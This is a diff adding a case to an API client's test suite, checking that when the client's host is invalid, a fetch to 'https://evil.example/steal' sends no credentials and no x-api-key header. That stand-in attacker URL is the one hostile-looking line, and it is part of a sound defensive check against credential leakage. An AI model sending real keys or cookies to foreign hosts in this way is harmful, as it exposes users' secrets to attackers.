@@ -1326,6 +1326,14 @@ describe('Client', () => {
         (fetchSpy.mock.calls[1]![1] as { headers: Record<string, string> })
           .headers['x-api-key'],
       ).toBeUndefined()
+
+      ;(client.clientHttp as { host: string }).host = 'not a url'
+      await client.fetch('https://evil.example/steal')
+      expect(fetchSpy.mock.calls[2]![1]).not.toHaveProperty('credentials', 'include')
+      expect(
+        (fetchSpy.mock.calls[2]![1] as { headers: Record<string, string> })
+          .headers['x-api-key'],
+      ).toBeUndefined()
     })
 
     it('clears local auth context even if rpc:logout fails', async () => {
